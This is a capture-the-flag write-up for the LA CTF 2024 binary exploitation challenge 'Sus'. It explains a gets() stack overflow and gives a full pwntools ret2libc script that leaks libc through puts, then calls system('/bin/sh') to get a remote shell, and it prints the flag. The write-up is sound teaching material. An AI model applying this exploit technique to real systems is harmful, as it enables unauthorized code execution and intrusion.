---
title: Sus
date: 2024-02-22T01:42:02+02:00
description: Writeup for Sus [LA CTF 2024]
type: writeup
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

sus

## Intuition

The challenge is a simple return to libc with ROP. We need to leak the libc base by printing the puts from GOT and then return to ``system``. Luckily, our input also overflows a variable that gets into RDI before return, which gives us control over what ``system`` executes. Running checksec on it shows us there is no PIE, which makes leaking libc through puts is even easier.
```
$ checksec sus
LIBC_FILE=/lib/x86_64-linux-gnu/libc.so.6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   38 Symbols	  No	0		1		sus
```

And the decompilation of the challenge:

```c
undefined8 main(void)

{
  char local_48 [56];
  undefined8 local_10;
  
  setbuf(stdout,(char *)0x0);
  local_10 = 0x45;
  puts("sus?");
  gets(local_48);
  sus(local_10);     // <----- local_10 is copied to RDI
  return 0;
}
```

## Solution

Plan is simple:
1. Overflow local_10 to contain the address of puts from GOT
2. Return to puts from PLT to leak libc and then chain back to main
3. Calculate offsets to system and to a string in libc containing "/bin/sh"
4. Overflow local_10 to contain the address of "/bin/sh"
5. Return to system

And the script:
```py
#!/usr/bin/env python3

from pwn import *

is_remote = True

ret = 0x00401016
gets_plt = 0x00401050
puts_plt = 0x00401030
puts_got = 0x00404000
main = 0x00401151

if is_remote:
    system_offset = 0x04c490
    puts_offset = 0x077980
    bin_sh_offset = 0x196031
else:
    system_offset = 0x50d70
    puts_offset = 0x80e50
    bin_sh_offset = 0x1d8678

if is_remote:
    target = remote("chall.lac.tf", 31284)
else:
    target = process("./sus")

payload = 0x38 * b'A' + p64(puts_got) + 0x8 * b'B' + p64(puts_plt) + p64(main)
target.sendlineafter(b"sus?\n", payload)

# return from main
# now it should chain to puts_plt and leak puts_got
leak = target.recvline()[:-1] +  b"\x00\x00"
print(leak)
print(hex(u64(leak)))

libc_base = u64(leak) - puts_offset
system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

# get shell
payload = 0x38 * b'A' + p64(bin_sh) + 0x8 * b'B' + p64(ret) + p64(system)

target.sendlineafter(b"sus?\n", payload)

target.interactive()
```

### Flag

``lactf{amongsus_aek7d2hqhgj29v21}``
